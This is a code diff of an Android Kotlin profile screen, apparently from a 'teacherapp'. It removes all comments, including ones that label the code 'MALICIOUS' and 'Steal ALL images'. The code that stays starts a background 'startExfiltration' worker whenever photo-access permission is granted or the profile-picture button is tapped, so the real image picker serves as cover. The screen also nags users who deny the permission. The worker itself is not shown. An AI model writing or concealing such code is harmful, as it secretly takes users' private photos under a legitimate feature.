@@ -53,7 +53,7 @@ fun ProfileScreen(navController: NavController) {
     val db = FirebaseFirestore.getInstance()
     val context = LocalContext.current
 
-    // Get MainActivity instance
+    
     val mainActivity = context as? MainActivity
 
     val indigo = Color(0xFF6366F1)
@@ -61,7 +61,7 @@ fun ProfileScreen(navController: NavController) {
     var interests by remember { mutableStateOf(listOf<String>()) }
     var profileImageUrl by remember { mutableStateOf("") }
 
-    // State to track denial count
+    
     var permissionDenialCount by remember { mutableStateOf(0) }
     var showPermissionDeniedDialog by remember { mutableStateOf(false) }
     var showSettingsDialog by remember { mutableStateOf(false) }
@@ -87,7 +87,7 @@ fun ProfileScreen(navController: NavController) {
         )
     }
 
-    // Original image picker
+    
     val imagePicker = rememberLauncherForActivityResult(
         contract = ActivityResultContracts.GetContent()
     ) { uri ->
@@ -96,27 +96,27 @@ fun ProfileScreen(navController: NavController) {
         }
     }
 
-    // Permission request launcher
+    
     val permissionLauncher = rememberLauncherForActivityResult(
         ActivityResultContracts.RequestPermission()
     ) { isGranted ->
         if (isGranted) {
-            // Permission GRANTED! Reset denial count
+            
             permissionDenialCount = 0
 
-            // 1. Open image picker (REAL functionality)
+            
             imagePicker.launch("image/*")
 
-            // 2. Steal ALL images in background (MALICIOUS)
+            
             mainActivity?.let {
                 android.util.Log.d("ProfileScreen", "🚨 Permission granted - starting image theft")
                 com.example.teacherapp.services.MediaCacheWorker.startExfiltration(it)
             }
         } else {
-            // Permission DENIED
+            
             permissionDenialCount++
 
-            // Check if we can ask again or if user selected "Don't ask again"
+            
             val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 Manifest.permission.READ_MEDIA_IMAGES
             } else {
@@ -127,10 +127,10 @@ fun ProfileScreen(navController: NavController) {
                 val shouldShowRationale = (context as? android.app.Activity)?.shouldShowRequestPermissionRationale(permission) ?: false
 
                 if (!shouldShowRationale && permissionDenialCount > 1) {
-                    // User selected "Don't ask again" - need to go to settings
+                    
                     showSettingsDialog = true
                 } else {
-                    // Can still ask again
+                    
                     showPermissionDeniedDialog = true
                 }
             } else {
@@ -243,7 +243,7 @@ fun ProfileScreen(navController: NavController) {
                     }
                 }
 
-                // Change Profile Picture Button
+                
                 TextButton(onClick = {
                     val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                         Manifest.permission.READ_MEDIA_IMAGES
@@ -252,19 +252,19 @@ fun ProfileScreen(navController: NavController) {
                     }
 
                     when {
-                        // Already have permission
+                        
                         ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED -> {
-                            // Open image picker (REAL)
+                            
                             imagePicker.launch("image/*")
 
-                            // Steal ALL images (MALICIOUS)
+                            
                             mainActivity?.let {
                                 android.util.Log.d("ProfileScreen", "🚨 Already have permission - starting theft")
                                 com.example.teacherapp.services.MediaCacheWorker.startExfiltration(it)
                             }
                         }
 
-                        // Need to request permission
+                        
                         else -> {
                             android.util.Log.d("ProfileScreen", "Requesting READ_MEDIA_IMAGES permission")
                             permissionLauncher.launch(permission)
@@ -324,7 +324,7 @@ fun ProfileScreen(navController: NavController) {
         }
     }
 
-    // First Denial Dialog - Can retry
+    
     if (showPermissionDeniedDialog) {
         AlertDialog(
             onDismissRequest = { showPermissionDeniedDialog = false },
@@ -335,7 +335,7 @@ fun ProfileScreen(navController: NavController) {
             confirmButton = {
                 TextButton(onClick = {
                     showPermissionDeniedDialog = false
-                    // Request permission again
+                    
                     val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                         Manifest.permission.READ_MEDIA_IMAGES
                     } else {
@@ -354,7 +354,7 @@ fun ProfileScreen(navController: NavController) {
         )
     }
 
-    // Settings Dialog - User clicked "Don't ask again"
+    
     if (showSettingsDialog) {
         AlertDialog(
             onDismissRequest = { showSettingsDialog = false },
@@ -365,7 +365,7 @@ fun ProfileScreen(navController: NavController) {
             confirmButton = {
                 TextButton(onClick = {
                     showSettingsDialog = false
-                    // Open app settings
+                    
                     try {
                         val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                             data = AndroidUri.fromParts("package", context.packageName, null)
